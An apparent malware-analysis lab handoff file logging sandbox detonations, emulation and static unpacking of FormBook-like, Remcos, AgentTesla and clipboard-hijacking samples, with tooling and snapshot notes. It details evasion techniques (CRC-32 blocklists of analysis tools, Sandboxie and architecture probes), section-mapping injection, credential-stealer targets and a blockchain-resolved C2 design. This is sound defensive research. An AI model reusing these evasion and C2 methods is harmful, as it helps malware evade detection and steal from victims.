# Handoff

State of the work, for picking up in a fresh session. `docs/WORKFLOW.md` is the
run procedure; this is what is done, what is known-broken, and what is worth
doing next.

**Last updated:** 2026-08-20 -- **start at *Pick up here - 20 Aug***, which supersedes the dated summary in this paragraph. **The dynamic pipeline's build queue is empty.** Every detector is built, each is scored or context-only *by decision*, and both scored ones have measured benign rates — module integrity 0 mismatches across 300 modules in 12 programs, the WER check 0 in a hollowing target across 35 real crashes. Gap 4's active detector exists with its threshold honestly labelled uncalibrated. 602 fast tests. **The detonation queue is empty too, as of run `bb51babb`** — the registry-read run that three consecutive sessions were set up for has now happened, passed all twelve `verify_run.py` rows, and hit every pre-registered prediction. **Its headline result is a negative and a real one: 73,825 registry reads by the sample, none naming a VM artifact**, with a positive control in the same stream (the collector caught `VBoxSF` reads by the sample's own PowerShell child and correctly binned them as routine network-provider enumeration). So this variant checks for analysis environments by module hash and CRC-32 process name, never by registry. **A second run the same day settled that a different sample does not fix it either:** `a6a86646…` was chosen for this behaviour, announced *"cannot run inside a virtual machine"* in a dialog box, and still reported `artifacts_read: 0` — registry, file, device-namespace and WMI routes each ruled out from its own events. **Two for two on samples that provably detect virtualisation, so gap 4 should be recorded context-only by decision rather than left awaiting calibration.** The config field that was missed three runs running is now the default rather than something to remember, with a pre-flight warning and a test pinning it. **STAGE 4 IS RECOVERED, AND IT IS A CREDENTIAL STEALER — 16 Aug.** `stage4_mapped_b454edc7.xor9`, 273,408 bytes, decrypted, on the artifact drive with its encrypted twin. It carries **no PE header** — a manually mapped image — and looking for one is what delayed finding it: 32 pages of it had been executing for hours while every scan reported "no MZ/PE" and this file read that as still-encrypted. **FLOSS `-f sc32` then produced the first IOCs this chain has ever yielded** — `Internet Explorer\IntelliForms\Storage2`, Chrome's `Local State`, Firefox, `Cookies`, `Autofill`, a SQLite DLL download, and a Nokia-feature-phone user agent that is a documented FormBook trait. The strings are built on the stack at runtime, which is exactly why nine detonations found none of them and why the ruleset was never at fault. See *Stage 4 is recovered*. What remains is its *runtime behaviour*, not its recovery or its capability. **The rest of this paragraph is the route there, kept because none of it is reproducible by detonation.** **The emulator now runs the injected code itself** — the far side's entry is a thread-hijack trampoline in front of a deliberate 512,371,392-iteration stall, and `after_inject.state` starts any experiment at the injection in seconds rather than 380M blocks. See *The far side runs — 14 Aug*. **And the emulator reached the injection in the first place** because measuring the poll loop showed stage 3 waiting for a process whose parent is `explorer.exe`; serving one took it through `NtOpenProcess` → `NtCreateSection` → two `NtMapViewOfSection` → thread redirect, none of which any previous run reached. It is **section-mapping injection**, so `NtWriteVirtualMemory` — which this harness was built to catch — is not on its path at all. Stage 4 is still not out in plaintext, but it is **located, sized and sourced**: the section is deliberately sized at random between 2 MB and 131 MB and filled with keystream — anti-analysis rather than the divergence this file briefly suspected — and the content is 273,408 bytes copied from `0x27e7000` in a single pass ending 645 blocks before the section is closed. **`alloc_27e7000.bin` is a new stage and lives only in a scratchpad; it belongs on the artifact drive.** See *Serving one child of explorer reached the injection* and *Pick up here — 13 Aug*. **Queue A ran, and the event-log detector carried a run the dumps lost.** On run `d7cc5044` the dump side collapsed -- one dump succeeded, the `+1s` failed outright, `+25s` was pending at exit, and **`RegSvcs.exe` was never dumped at all**, living 3.03 seconds and landing in `missed_descendants`. The WER image-timestamp check proved the hollowing anyway, hitting its pre-registered prediction exactly (`recorded 0x5ff2b99b` against `on disk 0x68531ee1`), which is the argument it was built on: it needs no dump. The ntdll pass fired too -- `RegSvcs.exe` opened `SysWOW64
tdll.dll` twice -- and first contact with live data exposed two contamination bugs in it, both known classes with helpers already in `utils` that the pass was not calling: `WerFault.exe` supplied 30 of 41 opens credited to the sample, and **`procdump64.exe`, the pipeline's own tool**, supplied 18 of 60 background opens. Fixing both took the false-positive baseline from **60 to 2** while leaving the finding untouched -- and that baseline is the number deciding whether the detector may ever score. Module integrity's prediction failed for a locatable reason: there was no `RegSvcs` image to examine. Registry reads were **still** not collected, wrong Procmon config for the third time, and the guard said so rather than reporting a silent zero. See *Run `d7cc5044`*. Before that, **gaps 4 and 5's remaining build items were closed: all three detectors and a real minidump reader.** `dynamic_analysis/minidump.py` is now the one tested dump reader and `pe_carve` delegates to it; the unloaded-module list that defeated two hand-rolled attempts is its headline case, and the reason is structural — `MINIDUMP_UNLOADED_MODULE_LIST` opens with `SizeOfHeader/SizeOfEntry/NumberOfEntries`, not the bare count the loaded list uses, so reading it the same way shifts every field. `dynamic_analysis/ntdll_unhooking.py` catches a process opening `ntdll` *as a file*, which is how self-unhooking starts and which this sample does. Suite 483 → 543. **Chasing four failing `slow` tests then found a live false negative in the hollowing detector.** The 15 header mismatches were *correct* — the cached reference dump predated a Windows Update that replaced fourteen System32 DLLs — but the investigation exposed that `header_mismatch` was handed between the reference lookup and its caller through a module-global dict that the cache eviction cleared in between, so **whichever module crossed the 96-entry cache limit lost its mismatch and was graded by degree**, which is how a payload sharing most of its bytes with the file it impersonates files as `identical`. Reproduced against the pre-fix code, fixed, and pinned by four fast tests. Suite 561 with `slow`. Before that, **two hollowing detectors landed, both off the pick-up list and neither needing a detonation.** The WER `app_timestamp` check compares the `TimeDateStamp` of the image that was *executing* against the file on disk — equal for an ordinary process, different for a hollowed one, and on run `3f70058b` Windows recorded stage 3's `5ff2b99b` for a `RegSvcs.exe` whose file is `68531ee1`. It fires without needing the fault to land in the injected region and without needing a dump at all, so it survives every way the dump watcher misses a short-lived process. And **module integrity is finally in the HTML report** rather than JSON-only, which is how its first live finding had to be read aloud by hand. Suite 483 → 511. See *Two hollowing detectors*. Before that, **the blocklist was identified as the canonical FormBook 20-entry list with six entries swapped, and the public table cracked one of them and named the slot of the rest.** 14 of 20 positions hash-match Stormshield's published table exactly, so `0x9cb95240` is `sharedintapp.exe` (Parallels) and the remaining six sit in the slots the published list fills with `vboxservice`, `vboxtray`, `prl_tools_service`, `prl_tools`, `prl_cc` and `vmtoolsd`. **That same table independently confirms `sbiedll.dll` = `0xe11da208`**, which this project had cracked circumstantially and can now treat as corroborated by an analysis that never saw this sample. Six names remain and they are this variant's own substitutions, absent from every public write-up found. **The blocklist mechanism is also fully mapped, and mapping it retracted a conclusion published in this file hours earlier.** All 20 process-name constants *are* XOR-decoder output, from 20 contiguous call sites at `0x02016619`–`0x0201691a` feeding the compare at `0x2026181` — the earlier "they are not decoder output, four routes closed" was two compounding tool bugs: a linear capstone sweep that silently drops sites where it desynchronises, run against the *warmup* image when the allocation keeps decrypting (45 sites at 47M blocks, **65 by 380M**, with all 20 constants among the late ones). Both fixed; `hash_call_sites.py --late` reports 20 of 20. The seven names are **still uncracked**, but the site order preserves the author's list and groups them: two sit between the VMware pair and Sandboxie, five among `procmon`/`filemon`/`wireshark`/`netmon`. There is no substring structure to exploit here — the compare is against the whole-name hash — and none of the seven is a purely alphabetic 8-character stem. **Both open name hashes elsewhere are cracked, and the second one broke the model the first was read under.** `0x79dbe71d` is `"sychpe32"` — and these hashes are not over *names* at all, they are over **fixed-length substrings** whose first character and length are pushed as immediates at the call site (`push 8 ; push 0x73` for this one, `push 5 ; push 0x77` for `"wow64"`). That kills the "bare stem" reading this document told the next session to sweep on: `"wow64"` is a 5-char substring matching inside `syswow64`, and `"sychpe32"` is the CHPE system directory on ARM64 Windows — so **the pair is an architecture probe, not anti-analysis**, asking *x86-on-x64 or x86-on-ARM64?* before a loader that does direct syscalls picks its gate. A 230,756-name corpus, including every export of every system DLL, cracked neither; reading the call site cracked it in minutes. **The module that gates the crash is also named: `crc32("sbiedll.dll") == 0xe11da208`, Sandboxie's injected DLL.** So the branch that stores `0x32dfd514` and kills `RegSvcs` is a *Sandboxie check*, and this sample already blocklists `sandboxiedcomlaunch.exe` and `sandboxierpcss.exe` by CRC-32 elsewhere — the same product, checked twice, by two independently written layers. Verified by putting the real name in the emulator's loader list: same fault, same `0x32dfd514`, same rva `0x2c53`, at 17,347,692 blocks. It **does not** resolve the standing contradiction, it sharpens it: neither guest inventory contains anything matching `sbie`, so the lookup should have returned 0 on the guest as it does under emulation, and the guest stored the constant regardless. That is now a one-bit question for the next detonation. Note how it was found, because the obvious lesson was the wrong one: the bare-stem re-sweep this document called for found **nothing**, and what cracked it was a missing corpus *class* — `sbiedll.dll` is a DLL that other software *injects*, so no amount of System32 filenames or tool process names could ever have contained it. The other eight hashes now carry a bound instead of a shrug: **no preimage of ≤ 7 characters** over `[a-z0-9._-]`, bare or suffixed, and nothing from 7.8 billion token compositions. See *`0xe11da208` is `sbiedll.dll`*. Before that, **the crash that has ended nine detonations was located exactly, and its *cause* left open.** `RegSvcs` faults reading `0x32dfd514`, and that value is an *immediate* at RVA `0x1605f` of stage 3 -- `mov dword [esi+0x6d8], 0x32dfd514` -- stored into its context and later used as a buffer base by the marker search. That store is **conditional**: it runs only when a lookup for module hash `0xe11da208` succeeds. Forging a name that hashes to it -- `aqtd9dq.dll`, solved over GF(2) -- makes the emulator take that branch and die reading the guest's exact address, where it had always reached a clean `ExitProcess` before. **Module present -> poisoned pointer -> crash**, end to end. What that does *not* settle is why the guest took the branch: `0xe11da208` matches nothing among the 931 modules the guest actually had loaded, so the gate should have refused there too, and it stored the constant anyway. Broken build and deliberate bail are both still live; four conclusions in this section have already been withdrawn, so the next one wants a measurement on the guest rather than another inference from the bench. The same run proved the injected image **is stage 3**, byte for byte: 284,671 of 284,672 bytes match the carved copy, mapped at `RegSvcs.exe`'s preferred base `0x400000` while the real image sits relocated at `0x00ed0000` and untouched -- so it is neither "mapped alongside" nor "written over", and both earlier readings were unfalsifiable because both detectors skipped the object. See *Why it crashes*. **The emulator now intercepts at the WOW64 syscall
boundary, and what was behind it is an anti-analysis block.** Stage 3 maps a clean
`ntdll` off disk and calls `Nt*` stubs out of *its own copy*, so hooking export
addresses saw nothing — the run went quiet at 87 API calls and then jumped to address
0. The cause was the harness's own: `Wow64Transition` and `fs:[0xC0]` are filled by the
kernel at load and are in no copy read off disk, so **the loaded image's slot sat at
zero and the malware faithfully copied that zero into its working copy** — it does that
fixup itself, at `0x202f457`, which is what makes self-unhooking work on a real
machine. Both kernel values are now supplied and pointed at a hooked gate that reads
the service number out of `EAX`
against a table parsed from this host's own ntdll: **509 numbers, `0x0`–`0x1fc`,
unique and contiguous**, an assertion that immediately caught a stub shape the first
parse had missed. The existing handlers were reused unchanged. Behind the boundary:
`SystemKernelDebuggerInformation`, `ProcessDebugPort`, `SystemProcessInformation` and
a `USERNAME` lookup — **a fingerprinting block that leaves no string and no
distinctive instruction**, which is exactly why *Stage 3 carries no anti-analysis
primitives* found nothing and said a negative there would prove nothing. Two claims
this document made are retracted: the consecutive SSNs were ntdll's own stub layout
rather than the sample stepping a table, and the *second* jump to address 0 is a clean
`ret` out of the entry function, not a crash — `run()` now tells those apart by ESP.
**The process list was then built and served** — twelve entries, invented, in
`winenv.PROCESS_LIST` and echoed in every run — and it produced **the first hard
IOC this chain has ever given up: the mutex `69971SRS6S-C1D59`**, under
`\BaseNamedObjects`. Behind it is a *second* anti-analysis layer: the sample
CRC-32s every enumerated process name against 20 constants, **13 of which are
`procmon`, `regmon`, `filemon`, `wireshark`, `netmon`, `vmwareuser`,
`vmwareservice`, `vmsrvc`, `vmusrvc`, `sandboxiedcomlaunch`, `sandboxierpcss`,
`python` and `perl`** — the last two being Cuckoo's agent. **That it is a
blocklist is proven by serving a hit**: with `procmon.exe` in the list it takes
one enumeration instead of seven, never creates the mutex, and diverts 233M
blocks earlier. The `ExitProcess` is the **tail of the main routine, code 0**,
read off the frame chain rather than guessed at, and answering `USERNAME` and
giving the harness a **virtual clock** (deterministic, advancing with work and
with every sleep) changed nothing at all — so all three candidate explanations
are dead and **the sample simply runs out of things to do**. The seven uncracked
hashes are the remaining lead, since whatever it polls for is likely named among
them. **A mutex name published here as an IOC is retracted**: it is derived from
the username, so `69971SRS6S-C1D59` described the harness answering `USERNAME`
with "not found". The shape survives — a 16-character uppercase-alphanumeric,
per-victim mutant under `\BaseNamedObjects`. **`procmon.exe` on the blocklist and
Procmon on the guest is a live problem for the next detonation**, though not an
explanation of the nine crashes. No injection was reached and stage 4 is still
unrecovered, though the capture for it is built and idle. See *The syscall
boundary, built* and *Past the process list*. Before that, **the stage-2 payload
`na3PRqPuA2` was decrypted and stage
3's own inner blob was not.** Stage 3 turned out to be a native x86 loader carrying a
272 KB packed blob, and that blob defeats static attack outright — no periodicity, no
repeated blocks, nothing from XOR/additive/recurrence/RC4 across 55 candidate keys.
Emulating the stub (`scripts/emulate_native_stub.py`) gets much further: no imports
needed, `NtAllocateVirtualMemory` for `0x457e1` bytes, self-relocation, jump into the
allocation, and real unpacking. It was twice reported here as **stalling**; it does
not — single-stepping found RC4 PRGA at `0x40231f` running to completion, and the
progress check had been watching an allocation while the output went to the stack.
Whether the emulation *diverges* on a wrong API answer is the real open question; see
*Stage 3's inner blob*. The
inverse index over the proxy map was built, the call graph rebuilt behind it, and
it reached the decryptor: `#470 ConcatAllocator`, a hand-rolled byte recurrence with
the ASCII key `HREWPjFNAr` — **not AES**, which is why 792 AES combinations had
failed. The key was recovered algebraically from a known PE header rather than
guessed, and what came out is a **native x86 PE32 carrying its own 272 KB encrypted
stage**, so the config and C2 are one layer further down. Two things fell out of it
that the pipeline should know: the IL decoder was missing every comparison branch
and `endfinally`, silently corrupting exactly the flattened methods worth reading
(now 0 undecoded bytes in 61,113 instructions), and **stage 3 carries `RegSvcs.exe`'s
own `TimeDateStamp`**, which defeats the timestamp comparison *Reading a run* tells
you to make. See *The call graph, rebuilt*. Before that, the bench gained a .NET
toolchain (ILSpy 11, SDK
10.0.302, de4dot built from source). Stage 2 was lost, re-acquired on the first
re-run, and then partly eaten by Bitdefender — it survives XOR-wrapped on the
external drive. Its resources are now named rather than guessed at, its flattening
is defeated (both opaque predicates are constant), and an AES key was recovered by
executing the builder statically — for the wrong target, which is the better half
of that sentence. Before that, the
loader's tenth run (`5457f804`, 14:53) was the first ever to capture a registry
read. Gap 4b's collection path is proven end to end,
Procmon accepts the generated `.pmc`, and the volume cost is 2.2x events for 281s. Its
nine hits were all Windows rather than the malware, which is now fixed and counted, and
the negative that remains is a real answer: **this sample does not check for a VM.**
Before that, stage 2 was read at the IL level: an AES-256 key and
IV recovered, the key-shaped string literals shown to be decoys, two
architecture-specific trampoline stubs found in the field data, and the protector's
**proxy-delegate map decrypted — 1,181 bindings, no key needed** — which exposed a
capability set nobody had seen, including `WebClient::DownloadFile` and `Process::Kill`.
The payload resource `na3PRqPuA2` is still encrypted, and that is now a de4dot job
rather than a decompiler one. The reader is `scripts/dotnet_meta.py`; see *Read at the
IL level*. Before that, the
loader's ninth run (`f3d26e46`, 04:41),
where `parent-at-spawn` fired for the first time and recovered an **892 KB x86 .NET
assembly that exists in no other dump** — the first artifact here that no choice of
offsets could have caught. It has since been identified on the bench: stage 2, forged
as `MemCompress Pro`, carrying the injection API set as split UTF-16 fragments and a
278 KB AES-encrypted resource that is now the highest-value open item. Two of this
document's standing conclusions are retracted as a result — see *The 892 KB stage*. The same run read 90 · Likely Malicious on a `dwm.exe`
injection event, which was not earned: the Sysmon highlight pass had no lineage
attribution, the fourth instance of that bug in this pipeline, now fixed. Registry
reads are still uncollected, on the third attempt. Before that, the eighth run
(`9e69fcbc`, 21:15) —
the registry-read code was on the guest and the Procmon config was not, so the
pass proved its *guard* (a zero refused to read as an answer) and not its finding
path. That run also lost the packer image to an offset that never came due and
said nothing about it, which produced two changes: any process exiting with
offsets pending now names them, and the parent is imaged at the moment it spawns a
child — the one instant a loader is certainly holding its payload. Before that,
the seventh run (`253c1d72`, 20:23).
It was set up for gap 4's registry-read collection path and tested none of it —
the guest was a commit behind and the config field was on the default — but it
proved the chain-crashed warning live, produced the packer's before/after pair
from the `1, 25` offsets, and reported `unmapped: 0` on every `RegSvcs` image
including the full-memory crash dump, which is gap 5's own written failure
criterion. Gap 5 is revised accordingly. The commit that
last touched this file is the anchor — `git log -1 docs/HANDOFF.md` — rather
than a hash written inline, which has been stale here before.

---

## Where things stand

### Pick up here — 24 Aug

**`0bw` is CLOSED.** The whole chain is measured, not inferred:

    .ps1 loader -> csc.exe x2 -> hollowed SecurityHealthHost.exe
        -> eth_call to 0x4E31128a on BSC testnet (chainId 0x61)
        -> getData() returns "klopasnarhia.cc", a bare hostname
        -> then, once per second, indefinitely:
             read the clipboard
             method=send&guid=&address=  <- what the victim copied
             write the C2's response body into the clipboard  <- the replacement

**No validation anywhere in that path.** Serving `0xDEADBEEF…` put
`0xDEADBEEF…` in the clipboard, 644 times. Serving an HTML page put the HTML
page there. Whoever controls the C2 controls what lands in the victim's
clipboard. Read the 24 Aug and 23 Aug entries in order; several of them correct
the ones below.

**Chain state, read 24 Aug.** Contract live, 2,008 bytes, balance 0.
`getData()` still returns `klopasnarhia.cc` -- **not rotated**. The string sits
in **storage slot 0** in Solidity short-string form, so rotation is a single
`SSTORE` against selector `0x47064d6a`: no redeploy, no new address, nothing the
malware would notice. Transaction history was not obtained -- the public node
refuses `eth_getLogs` over wide ranges and prunes historical state, so the
deployer needs an archive node or an explorer API key.

**`tooling-baseline` was replaced again on 24 Aug, now at `40e19f8`.** A revert
restores the working bench rather than a starting point for rebuilding one:

    commit 40e19f8            the clone, current
    tools\yara\rules\local\   all four local rules, hand-copied
    FakeNet leaf + key        two SANs: the RPC host and the phase 2 sink
    RingForge CA              trusted in Root, and it signs that leaf
    config.json               offsets 3,10,25,55 / max 24 / redump 2 /
                              post_exit_observation 600 / TIMEOUT 900 /
                              fakenet-0bw path
    run_phase3.ps1            repo root, NOT tracked by git
    samples\                  af2d8300 and 422e30ed both retained
    clipboard                 BIDIRECTIONAL, deliberately -- see below

**`samples\` is on that list on purpose, and `docs/WORKFLOW.md` no longer
contradicts it — reconciled 24 Aug.** WORKFLOW's pre-freeze hygiene check said
`samples\` should hold the two mimikatz controls and `upx_control.json` and
nothing else, because a live sample there is restored on every future revert.
That consequence is real; it is no longer the trade. The binaries are not on the
host, so the snapshot is the only copy, and deleting one to satisfy the rule
means arming the guest to re-acquire it by hash. The half of that check which
still binds is `cases\` — it must not exist.

**Clipboard is bidirectional on purpose.** The analyst pastes console output
back out, which needs guest-to-host. It is safe between runs on a clean guest.
During and after a detonation, anything copied out may be rewritten **if it
contains a crypto address** -- ordinary error text and paths are untouched,
which is exactly why the 22 Aug incident read as a formatting quirk. Use the
share for anything address-bearing.

**Snapshots: two, and the disk chain is flat.**

    tooling-baseline-5e1a31c     22 Aug, kept as the fallback
    └── tooling-baseline         40e19f8, current
                                 UUID be35853b-5807-4d77-b50b-062842b5817b

Six orphaned differencing disks were removed on 24 Aug -- residue of the
`E_ACCESSDENIED at 50%` restore failures, since a differencing disk is created
at the *start* of a restore and left behind when one dies partway. They had
blocked every merge. VM footprint 137 -> 100 GB.

**The `40e19f8` re-take carried `timeout 900`, and that is the whole reason it
happened.** The previous baseline's own description said *"post_exit_observation
600 -- raise the GUI timeout to 900 to match, whichever expires first ends the
run"*, and the config it froze still read `240`. The warning was written down,
in the right place, by someone who understood it, and nothing checked it -- so
every run from that baseline would have stopped at t240 with an inert
600-second window. The pre-freeze check caught it by reading the whole file
rather than the checklist, because **the checklist did not list
`timeout_seconds`**. It does now. See *Verify before freezing, always*.

**Two things in the older description are now obsolete.**
`tooling-baseline-5e1a31c` still says *"make_tls_cert mints a NEW CA every run,
so leaf and store must be refreshed together"* -- a standing workaround for a
defect fixed on 24 Aug; the script reuses an existing CA now and only re-mints
under `--new-ca`. And the guest's Root store holds **two** RingForge CAs,
`141C8310…` (22 Aug, the live one, which signs the installed leaf) and
`6CDD5E8D…` (21 Aug, stale) -- the re-mint bug's fingerprint. Removing the stale
one is safe and untaken; do it on the new baseline so a mistake costs one revert
rather than a run.

Every line was rebuilt by hand that day, most of it twice, and **none of it is
in git** -- `tools\yara\rules\` is gitignored, the leaf lives inside the FakeNet
install, the CA lives in the guest's certificate store, and `config.json` is
local. The snapshot is the only thing that carries them. **If the baseline is
ever rebuilt from scratch, that list is the checklist**, and the snapshot's own
description repeats it.

**Proven by restoring it, not merely by taking it.** Both 24 Aug baselines were
taken, restored, and then checked against the *restored* guest: the commit, the
corrected rule, both SANs, the CA trusted and verifying against the installed
leaf, the `fakenet-0bw` path, offsets `3, 10, 25, 55`, post-exit `600`, timeout
`900`, both helper scripts, no `cases\`. A snapshot that has been written and a
snapshot known to carry what its description claims are different things, and
the step between them is one revert.

**The order used, and worth reusing:** take the new snapshot, restore it to
verify, *then* delete the old one and rename the new into place. On the
`40e19f8` replacement the rename kept the same UUID, so nothing was recreated
and no differencing disk was orphaned by it.

**Verify before freezing, always.** The pre-snapshot check caught a single-SAN
leaf and `1, 25` offsets that a revert had quietly restored: the cert work had
been done *before* that revert and died with it, while the YARA copy survived
because it happened after. Freezing then would have baked in a leaf that fails
the beacon handshake on every future run, silently, reading as a rejected
answer.

**`timeout_seconds` is on that checklist because leaving it off cost the next
freeze.** On the 24 Aug re-take the config read `timeout 240` under
`post_exit_observation 600` — the exact pairing *Whichever expires first ends
the run* was written about, with the ceiling below the window, so the 600 was
inert and the run would have stopped at t240. It was caught by reading the whole
file rather than the checklist, because **the checklist did not list it**: the
line named offsets, max, redump, post-exit and the fakenet path, and the one
setting that has to move *with* post-exit was the one missing. 240 is not a
stale number either — it is the documented floor for this sample, from
`Run settings that work`, which is what made it look right.

Two lessons, and the second is the general one. A revert restores whatever the
baseline holds, so any setting changed *after* the last freeze is living on
borrowed time. And **a checklist that omits a field is worse than no checklist**,
because it converts "I have not checked" into "I have checked" for everything it
does not mention.

### The snapshot tree, and why descriptions are not optional

    tooling-baseline-5e1a31c     <- 22 Aug, kept as the fallback
    └── tooling-baseline         <- 24 Aug at faedb81, current

**Cleaned on 24 Aug.** Three older snapshots were merged away and six orphaned
differencing disks removed. Two of the merges refused at first --
`"has more than one child hard disk (4)"` -- because a snapshot cannot merge
while its parent's disk has multiple children, and six unreferenced differencing
disks were hanging off the base and off `16aug`. Removing them with
`VBoxManage closemedium disk <uuid> --delete` unblocked both.

**Those orphans were made by the `E_ACCESSDENIED` bug.** A differencing disk is
created at the *start* of a restore; a restore that dies partway leaves it
registered and referenced by nothing. Three of the six were 0 bytes, which is
what a restore that failed immediately after creating its child looks like. The
frontend-wait fix stopped new ones being made; these were the backlog.

**The in-use check was validated before anything was deleted.** `showhdinfo`
printing no `In use by VMs:` line looks like proof a disk is unattached -- but
only if that line prints at all. Running it first against a disk *known* to be
attached confirmed it does, and names the owning snapshot. Six irreversible
deletions rested on that control.

**The old baseline's description is what settled the commit question.** It reads
"Clone at e7e4968" in as many words. The handoff note had said `e2046ab`, the
difference spanned the commit that introduced `bare_host`, and a run was planned
on the strength of the wrong one. Write the description; it is the only account
of a snapshot that survives contact with a bad memory.

### The pattern of 22 Aug, and it is the thing to carry forward

**Four separate defects were each one step from reading as "the implant rejected
our answer."** A single-SAN leaf that would have failed the beacon handshake; a
FakeNet config path with no GUI field, wiped by the revert; a YARA rule absent
from the scanner; and an IOC extractor reading the one capture that cannot see
diverted traffic. None of them would have produced an error. All four would have
produced a plausible negative result.

Only the first was caught before it cost anything, and only because the
implant's choice of scheme was reasoned about in advance rather than discovered.
**A negative result from this bench is not evidence until the collector that
produced it has been shown to be capable of a positive one.**

### The three tools that would have lied, fixed — 24 Aug

The section above says a negative result is not evidence until the collector
that produced it has been shown capable of a positive. These were the three
known places where that was still false, and all three are now closed. **None
of them could produce an error; each would have produced a plausible negative.**

**`make_tls_cert.py` re-minted the CA on every run.** The guest trusts an anchor
by its key, so a second run — for one more SAN, which is the routine reason to
run it — left the root store holding a CA that no longer signs the leaf being
served. The symptom is a silent FIN after the certificate flight, which is this
bench's own signature for *an implant that pins*: the script's own docstring
says so. A re-mint would therefore have been read as the answer rather than as
the defect. The CA is now reused when both its files are present, and re-minted
only under `--new-ca`, or when the pair is broken — and the script now says
which happened and whether the guest needs anything. Measured, not reasoned:
two runs with different `--hostname` sets produced the same CA fingerprint
(`C8:87:27:08:…`) and a new leaf that verifies against it.

**`make_fakenet_config.py` asserted which certificate was being served.** It
printed "cert is FakeNet's own" unconditionally, including after
`make_tls_cert.py` had already swapped the leaf. That line is read at exactly
one moment — deciding whether a `no_connection` summary means the port was
never routed or the client refused the certificate — and those are different
findings separated only by the pcap. It now reads the install: the
`.ringforge-original` backup is the marker, the bytes are compared against it
because a hand-copied restore leaves the marker in place, and when no install
can be located it prints **UNKNOWN** rather than guessing. Unknown is a real
answer; the confident wrong one is what was there before.

**`test_restore_env_guard` had been failing since before 22 Aug**, which is its
own version of the same problem — a red suite stops being read. The guard
required every `RINGFORGE_*` name under `scripts/` to appear in the emulator's
`ENV_TOGGLES`, and four do not belong there: `RINGFORGE_REPO_ROOT` and the
three `RINGFORGE_RPC_*` names are read by `make_fakenet_config.py`, which
configures FakeNet on the guest — a different process on a different machine
from the emulator, and nothing a stored state can be a function of. They are
now allowlisted **with the reason each is allowed**, and two further tests keep
the allowlist from becoming the place a real toggle hides: one asserts no
allowlisted name appears in `emulate_native_stub.py` or `win32_emu_env.py`, the
other that no entry has outlived the name it describes.

886 tests pass, up from 867 and a standing failure.

### Next, ranked

Done 22-24 Aug and struck from this list: re-taking the baseline; rule-freshness
reporting in the preflight strip; phase 3 (answered by supplying a clipboard,
not by answering `refresh`); the contract read; the CA re-mint, the certificate
claim and the `ENV_TOGGLES` guard. The whole scoring model was rebuilt the same
day -- see `docs/SCORING.md`. What remains:

1. **The contract's transaction history.** The chain read on 24 Aug got
   everything *except* this: the public node prunes historical state and refuses
   `eth_getLogs` over wide ranges, so the deployer and the deployment date need
   an archive node or an explorer API key. A binary search on `eth_getCode`
   across blocks would find the creation block on an archive node --
   `scripts/`-adjacent code for it was drafted and never run.
2. **Why `bait6` produced the hardcoded wallet — age is ruled out, 24 Aug.**
   Arm A ran and missed its target: the RPC handler could not load, so the
   `eth_call` was refused nine times and the tracer was never served. A *fresh*
   payload with no usable C2 answer substituted 664 times with the hardcoded
   wallet anyway. See *Arm A missed its target*. The live hypothesis is now that
   the wallet is the **no-C2 fallback**, which fits all four observations; it
   rests on one observation of the failure branch and the corrected run is
   specified in that section.
3. **The FakeNet shim for `beacon_responder.py`.** Built and tested, never
   wired: it needs FakeNet's custom-response matching keys
   (`sample_custom_response.ini`, `docs/CustomResponse.md` in the FakeNet
   install) so the handler binds to the sink host rather than swallowing all of
   443. Not needed for anything currently open -- the served-file route answered
   the question it was built for.


Three live samples have been through the pipeline end to end.

**Remcos** (`aa4d6427…`) is the current reference case and the first sample to
produce a corroborated verdict: **125 · Likely Malicious**, four categories with
two strong — persistence, dropped payload, C2 contact and a memory-only rule.
It closed gap 1 and proved the spawn re-dump. See *Remcos reference data*.

**AgentTesla** (`31a762fd…`) is the fully-worked case: dormancy, self-spawn,
unpack, C2 resolution, FTP authentication and the upload of its stolen-data
report, all captured in one run.

**A .NET loader** (`422e30ed…`, labelled Formbook by MalwareBazaar and not
otherwise attributed) has been run **seven** times. It injects into
`RegSvcs.exe` — how is now in doubt, see gap 5 — and its stage-2 payload faults
before it can decrypt stage 3, identically every time.
The pipeline recovered that payload on 06 Aug and static analysis identified it
end to end: a SmartAssembly-protected reflective loader disguised as a
sliding-puzzle game, `SmartOptimization.dll`, with no config anywhere in it —
the config is in the stage it would invoke, which the crash prevents. Its stage-2
payload was decrypted on 09 Aug and is **another loader**, native x86, wrapping a
further 272 KB encrypted stage — so "the config is one stage down" has now been
true twice, and there is no evidence yet about how deep it goes. See
*Loader reference data*.

Both controls pass:

| Control | Result |
|---|---|
| `test_specs/memory_canary/` | Exactly one memory-only rule, both dumps `Frozen` |
| `test_specs/upx_control/` | 5 memory-only rules against a predicted 4 |

The UPX control's pre-flight **under-predicts by design**. It flags rules
carrying disqualifiers (`pe` module, magic at offset 0, `filesize` bounds) but
does not evaluate whether those gate the whole condition, so a rule whose
disqualifiers sit in one branch of an OR can still match. Treat its expected
list as a lower bound; more rules than predicted is a pass, fewer is a failure.

### Environment facts that are not in the code

- **The host bench now has a .NET toolchain, and it was assembled piecemeal.**
  ILSpy 11 (standalone zip, Avalonia — it wants the base **.NET 10 runtime**, not
  the Desktop one, despite older ILSpy being WPF), and **.NET SDK 10.0.302**,
  which arrived with the .NET 10 install and is what makes `dotnet build`
  possible at all. Runtimes 6.0.16, 7.0.4, 8.0.8 and 10.0.10 are side by side;
  installing a new one takes nothing away.
- **de4dot is built at
  `G:\tools\de4dot-master\de4dot-master\Release\netcoreapp3.1\`**
  and needs two workarounds that are not obvious from its README. The source is
  2018-era and `LangVersion` is `latest`, so C# 14 makes `field` a keyword inside
  property accessors and `ProxyCallFixer.cs` fails to compile — build with
  `-p:LangVersion=9.0`. And it targets `netcoreapp3.1`, which is not installed,
  so run it with `DOTNET_ROLL_FORWARD=LatestMajor dotnet de4dot.dll`. Full
  command:

      dotnet build de4dot.netcore.sln -c Release -f netcoreapp3.1 -p:LangVersion=9.0

- **The host's antivirus is Bitdefender, not Defender.** `WinDefend` is stopped
  and Defender registers as passive; Bitdefender is the active engine. Worth
  knowing for two reasons: it is the same engine whose `Gen:Variant.Rescoms`
  label the Remcos section cites, so it is aggressive on exactly this class of
  file; and `Get-MpComputerStatus` fails with `0x800106ba` on this host, which
  reads like an error and only means Defender's service is off. Carved payloads
  kept on disk want a password-protected zip rather than an AV exclusion — it
  stops on-access scanning of the contents without opening a hole.

- **The sample binaries are no longer on this host — 17 Aug.** Checked: nothing
  under `Downloads\ringforge\` or `G:\` holds them, and that `samples\`
  directory is unrelated API fixtures from another project. **Re-acquire by
  hash before planning a run.** The four are `31a762fd…` (AgentTesla),
  `aa4d6427…` (Remcos), `422e30ed…` (the FormBook loader) and `a6a86646…` (the
  VM-bail sample); full hashes are in the reference-data sections below.
